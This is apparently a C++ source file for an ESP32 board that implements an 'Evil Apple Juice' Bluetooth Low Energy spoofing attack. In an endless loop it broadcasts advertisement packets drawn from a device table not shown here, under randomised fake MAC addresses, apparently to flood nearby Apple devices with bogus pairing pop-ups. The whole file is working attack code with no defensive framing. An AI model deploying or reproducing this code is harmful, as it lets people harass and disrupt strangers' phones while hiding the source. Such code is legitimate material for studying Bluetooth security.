#include "evil_apple_juice.hpp"

BLEAdvertising *pAdvertising;
uint32_t delayMilliseconds = 1000;
uint8_t juice_status[2] = {0, 0};  // Initiated, Running

void evilAppleJuiceInit() {
  BLEDevice::init("StartName");
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void evilAppleJuiceStart(void *startJuice) {
  while (1) {
    // First generate fake random MAC address
    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++) {
      dummy_addr[i] = random(256);
      if (i == 0) {
        dummy_addr[i] |= 0xF0;
      }
    }

    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    oAdvertisementData.addData(std::string((char *)DEVICES[global_count], 31));

    int adv_type_choice = random(3);
    if (adv_type_choice == 0) {
      pAdvertising->setAdvertisementType(ADV_TYPE_IND);
    } else if (adv_type_choice == 1) {
      pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
    } else {
      pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
    }

    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    pAdvertising->setAdvertisementData(oAdvertisementData);

    Serial.println("Sending packets ...");
    pAdvertising->start();
    delay(delayMilliseconds);
    pAdvertising->stop();
    delay(1);
  }
}